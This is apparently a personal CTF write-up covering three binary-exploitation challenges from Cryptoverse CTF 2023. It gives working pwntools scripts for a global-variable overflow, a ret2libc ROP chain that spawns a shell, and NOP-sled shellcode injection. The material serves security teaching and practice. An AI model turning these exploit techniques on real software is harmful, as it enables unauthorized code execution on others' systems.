These are my writeups for all the pwn-challenges at Cryptoverse CTF 2023.

# Acceptance

We are give a binary which when reversed looks like this
```c
int print_flag(void){
  uint *puVar1;
  char flag [44];
  int flag_txt;
  if (accept < 1) {
    if (accept == -1) {
      flag_txt = open("/home/me/flag.txt",0);
      if (flag_txt == -1) {
        puVar1 = (uint *)__errno_location();
        fprintf(stderr,"Error num %d\n",(ulong)*puVar1);
      }
      else {
        read(flag_txt,flag,0x22);
        close(flag_txt);
        write(1,flag,0x22);
        putchar(10);
      }
    }
    else {
      puts("Nah, You are a liar!");
    }
  }
  else {
    puts("You ask a lot and she suspect me :((");
  }
  return 0;
}

int main(EVP_PKEY_CTX *param_1){
  init(param_1);
  puts("I wanna go out but I need mom\'s permisison.");
  printf("Help him: ");
  read(0,say,0x24);
  if (accept == 0) {
    puts("Arg! Why don\'t you help me :((");
  }
  else {
    print_flag();
  }
  return 0;
}
```

and have the following protections
```bash
$ checksec ./acceptance
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
{: .nolineno }

Our input is read into the global variable `say`, and ifthe global variable `accept` is not equal to 0 the `print_flag` function will be called. Inside `print_flag` we need the `accept` variable to be equal to 1.

We can overflow the `say` variable so that we overwrite the `accept` value, giving the value of -1.

We find the offset to the `accept` variable with a cyclic pattern in pwntools by breaking after our input has been read in
![Accept offset](accept_offset.png)

Knowing the offset we can write the -1 value to the `accept` variable
```python
io = start()

offset = 32
payload = b"A" * offset
payload += pack(-1)

io.recvuntil(b"him: ")
io.sendline(payload)

io.interactive()
```

# Ret2school

Main-function of the binary looks like this
```c
int main(EVP_PKEY_CTX *param_1){
  char input [32];
  init(param_1);
  printf("Send me your homework: ");
  gets(input);
  return 0;
}
```
and the binary has the following protections
```bash
$ checksec ./ret2school
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```
{: .nolineno }

Since we have the `gets` function gathering our input, and no stack-canary or PIE, this looks like a simple ret2libc attack where we find the base-address of ASLR before calling `system("/bin/sh")`.

We find the offset to be 40 by sending a cyclic pattern as input, and checking the offset into the cyclic pattern for the address we crash at, which in this case is `0x6161616161616166`
![Ret2school Offset](ret2school_offset.png)

Since we don't have a `puts` function to leak the GOT address of we leak for `printf` instead. In this case it leads to some extra stack-misalignments. Identifying stack-misalignment can be done by checking the instruction which we crash on, which in this case were `movaps`
![Stack Misalignment Crash](stack_misaligned.png)

This sometimes happen on 64-bit binaries, and can be solved by adding an extra `pack(ret)` in the payload to align the stack. I had to align the stack a total of 3 times for the full exploit to work.

The exploit ended up being
```python
offset = 40
libc = ELF('./libc.so.6', checksec=False)
ret = 0x40050e

io = start()

rop = ROP(exe)
rop.raw(b"A"*offset)
rop.raw(ret)
rop.printf(exe.got.printf)
rop.raw(ret)
rop.main()

io.recvuntil(b"homework: ")
io.sendline(rop.chain())

printf = u64(io.recvuntil(b"Send")[:-4].rstrip().ljust(8, b"\x00"))
log.success(f"printf: {hex(printf)}")
libc.address = printf - libc.symbols.printf
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A"*offset)
rop.raw(ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

io.recvuntil(b"homework: ")
io.sendline(rop.chain())
io.interactive()
```
{: .nolineno file=exploit.py }

which gives shell on the server
```bash
$ python3 exploit.py
[*] Loaded 14 cached gadgets for './ret2school'
[+] printf: 0x7fb6c7e7de40
[+] libc: 0x7fb6c7e19000
[*] Loaded 199 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
$ cat flag
cvctf{ret2libc_bfbfa238da098120}
```
{: .nolineno }

Although there were some stack-misalignment which were not expected (2 occurrences in the 1st payload) I managed to first-blood this challenge

This challenge were part 4 of a 5-part story, where the other challenges were in other categories than pwn.

This is a type of challenge which I have not written a writeup for yet! The reversed form of the binary looks like this
```c
void shell(void){
  char input [132];
  printf("Backdoor secret: %p\n",input);
  printf("Execute: ");
  gets(input);
  return;
}

int main(void){
  EVP_PKEY_CTX *in_stack_fffffff0;
  init(in_stack_fffffff0);
  shell();
  return 0;
}
```

and the binary protections
```bash
$ checksec ./shellprompt
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
{: .nolineno }

A binary without NX means that we can execute shellcode from the stack, and the `shell` function provides us with the address of the buffer where our input is located.

The exploit here is that we can input `shellcode` and overwrite the `rip` register to make the program jump to and start executing our shellcode.

We start by finding the offset to `rip` with the same method as the two previous challenges. We find the offset to be 140.

Since we have to write 140 bytes, consisting of our shellcode + padding, to start to overwrite `rip`, we will use a `nopsled` to lead the program execution to our shellcode.

If we had used e.g. `A`'s as the padding in our shellcode the program would crash to du `0x41` not being valid instructions. We will therefore use `nop` instructions which are `0x90`, as they just pass on the execution to the next instruction, until it eventually hits our shellcode. [Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo) has a nice video explaining the attack we perform more in detail.

So our payload will then consist of `nops + shellcode + buffer-address`, and ends up looking like this
```python
context.arch = 'i386'
offset = 140
io = start()

io.recvuntil(b"secret: ")
buffer = int(io.recvline().strip(), 16)
log.success("buffer: " + hex(buffer))

payload = asm(shellcraft.sh()).ljust(offset, b"\x90")
payload += pack(buffer)

io.recvuntil(b"Execute: ")
io.sendline(payload)
io.interactive()
```
{: .nolineno }

`shellcraft.sh()` is a pwntools function which creates assembly-instructions (our shellcode) which spawn a `/bin/sh` shell for us.
